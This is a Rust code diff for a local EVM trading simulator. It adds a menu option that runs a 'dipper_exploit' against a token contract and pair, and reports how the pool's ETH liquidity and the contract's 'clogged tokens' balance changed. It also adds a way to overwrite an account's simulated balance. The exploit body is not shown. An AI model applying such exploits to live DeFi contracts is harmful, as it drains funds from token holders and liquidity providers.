@@ -1,8 +1,8 @@
 use std::{fmt::Debug, sync::Arc};
 
 use actions::{
-    add_liquidity, approve, calculate_pair_address, enable_trading, get_token_balance,
-    transfer_erc20_tokens,
+    add_liquidity, approve, calculate_pair_address, dipper_exploit, enable_trading,
+    get_token_balance, transfer_erc20_tokens,
 };
 use actors::{me, weth_addr};
 use alloy::{
@@ -153,7 +153,97 @@ pub async fn simulate<M: Provider + Clone>(client: &M) {
             .unwrap();
 
         match menu_option {
-            0 => {}
+            0 => {
+                match dipper_exploit(
+                    &mut evm,
+                    dipper_contract_address,
+                    dipper_caller_address,
+                    calculated_pair_address,
+                    vec![*WETH_ADDRESS, target_token],
+                ) {
+                    Ok(result) => {
+                        printlnt!(
+                            "{}",
+                            format!("Dipper Exploit Success | {}", result).bright_green()
+                        );
+                    }
+                    Err(err) => {
+                        printlnt!("{}", format!("Dipper Exploit Failure | {}", err).red());
+                        continue;
+                    }
+                }
+
+                // Fetch ETH LP amount and clogged_tokens_amount after the exploit
+                let eth_lp_amount_after =
+                    get_token_balance(&mut evm, calculated_pair_address, *WETH_ADDRESS)
+                        .unwrap_or(U256::ZERO);
+
+                let clogged_tokens_amount_after =
+                    get_token_balance(&mut evm, target_token, target_token).unwrap_or(U256::ZERO);
+
+                // Calculate differences and percentage variations
+                let eth_lp_diff = if eth_lp_amount_after > eth_lp_amount {
+                    eth_lp_amount_after - eth_lp_amount
+                } else {
+                    eth_lp_amount - eth_lp_amount_after
+                };
+
+                let eth_lp_percentage = if eth_lp_amount != U256::ZERO {
+                    eth_lp_diff * U256::from(10000u64) / eth_lp_amount
+                } else {
+                    U256::ZERO
+                };
+
+                let eth_lp_increase = eth_lp_amount_after >= eth_lp_amount;
+
+                let clogged_tokens_diff = if clogged_tokens_amount_after > clogged_tokens_amount {
+                    clogged_tokens_amount_after - clogged_tokens_amount
+                } else {
+                    clogged_tokens_amount - clogged_tokens_amount_after
+                };
+
+                let clogged_tokens_percentage = if clogged_tokens_amount != U256::ZERO {
+                    clogged_tokens_diff * U256::from(10000u64) / clogged_tokens_amount
+                } else {
+                    U256::ZERO
+                };
+
+                let clogged_tokens_increase = clogged_tokens_amount_after >= clogged_tokens_amount;
+
+                // Display the ETH LP comparison
+                printlnt!(
+                    "{}",
+                    format!(
+                        "ETH LP Before: {}, After: {}, Change: {} ({:+.2}%)",
+                        format_ether(eth_lp_amount),
+                        format_ether(eth_lp_amount_after),
+                        format_ether(
+                            eth_lp_amount_after
+                                .checked_sub(eth_lp_amount)
+                                .unwrap_or_else(|| eth_lp_amount - eth_lp_amount_after)
+                        ),
+                        eth_lp_percentage // eth_lp_percentage.u128() as f64 / 100.0
+                                          //    * if eth_lp_increase { 1.0 } else { -1.0 }
+                    )
+                    .bright_green()
+                );
+
+                // Display the clogged tokens comparison
+                printlnt!(
+                    "{}",
+                    format!(
+                        "Clogged Tokens Before: {}, After: {}, Change: {} ({:+.2}%)",
+                        clogged_tokens_amount,
+                        clogged_tokens_amount_after,
+                        clogged_tokens_amount_after
+                            .checked_sub(clogged_tokens_amount)
+                            .unwrap_or_else(|| clogged_tokens_amount - clogged_tokens_amount_after),
+                        clogged_tokens_percentage // clogged_tokens_percentage.as_u128() as f64 / 100.0
+                                                  //    * if clogged_tokens_increase { 1.0 } else { -1.0 }
+                    )
+                    .bright_green()
+                );
+            }
             1 => {
                 approve_and_add_liquidity_eth(&mut evm, owner_address, target_token);
             }
@@ -195,7 +285,28 @@ pub async fn simulate<M: Provider + Clone>(client: &M) {
                     }
                 };
             }
-            4 => {}
+            4 => {
+                let new_balance_str: String = Input::with_theme(&ColorfulTheme::default())
+                    .with_prompt("Enter the new Account ETH balance")
+                    .interact_text()
+                    .unwrap();
+
+                printlnt!(
+                    "{}",
+                    format!(
+                        "Loading {} as the new ETH Balance of Account {}",
+                        new_balance_str, target_token
+                    )
+                    .yellow()
+                );
+
+                evm.db_mut()
+                    .0
+                    .load_account(target_token)
+                    .unwrap()
+                    .info
+                    .balance = parse_ether(&new_balance_str).unwrap();
+            }
             _ => unreachable!(),
         }
     }
